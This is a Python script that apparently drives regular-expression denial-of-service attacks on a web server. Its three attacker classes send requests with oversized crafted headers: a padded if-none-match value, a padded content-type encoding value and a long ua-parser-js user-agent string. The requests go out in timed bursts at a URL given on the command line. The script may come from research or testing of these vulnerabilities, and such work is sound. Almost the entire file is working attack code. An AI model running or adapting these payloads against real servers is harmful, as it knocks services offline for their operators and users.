import os
import sys
import time

os.system('python -m pip install requests')
import requests
import random
import string

class AttackerFresh:
    def __init__(self):
        self.count = 0

    def request_http(self, url, length):
        self.count += 1

        try:
            temp_length = length
            # temp_length = random.randint(length * 7 / 8, length * 9 / 8)
            r = requests.get(url, headers = {'if-none-match': 'x' + ' ' * temp_length + 'x', 'X-Server': '172.31.10.25'}, timeout=0.1)
            print ("attack, reply %d, %d" % (r.status_code, self.count))
        except:
            print ("attack, no reply, %d" % self.count)

class AttackerCharset:
    def __init__(self):
        self.count = 0

    def request_http(self, url, length):
        self.count += 1

        try:
            r = requests.get(url, headers = {'content-type': 'encoding=' + ' ' * length, 'X-Server': '172.31.10.25'}, timeout=0.1)
            print ("attack, reply %d, %d" % (r.status_code, self.count))
        except:
            print ("attack, no reply, %d" % self.count)

class AttackerParser:
    def __init__(self):
        self.count = 0

    def request_http(self, url, length):
        self.count += 1

        try:
            r = requests.get(url, headers = {'ua-parser-js': 'iphone ios ' + 'a' * length, 'X-Server': '172.31.10.25'}, timeout=0.1)
            print ("attack, reply %d, %d" % (r.status_code, self.count))
        except:
            print ("attack, no reply, %d" % self.count)

def run_attack(attacker, url, length, duration, interval):
    start_time = time.time()
    while time.time() - start_time < duration:
        send_time = time.time()
        attacker.request_http(url, length)
        elapsed = time.time() - send_time
        if elapsed < interval:
            time.sleep(interval - elapsed)

def main():
    url = sys.argv[1].strip()
    frequency = int(sys.argv[2]) # number of attacks per minute
    length = int(sys.argv[3]) # Unused
    
    interval = 60.0 / frequency
    
    print ('Start at %f' % time.time())
    time.sleep(10)

    attacker = AttackerFresh()
    run_attack(attacker, url, length, 20, interval)

    time.sleep(10)

    attacker = AttackerCharset()
    run_attack(attacker, url, length, 20, interval)

    time.sleep(10)

    attacker = AttackerParser()
    run_attack(attacker, url, 26, 20, interval)

    time.sleep(10)
    print ('End at %f' % time.time())

if __name__ == "__main__":
    print ('==========Start %f==========' % time.time())
    main()
    print ('==========End %f==========' % time.time())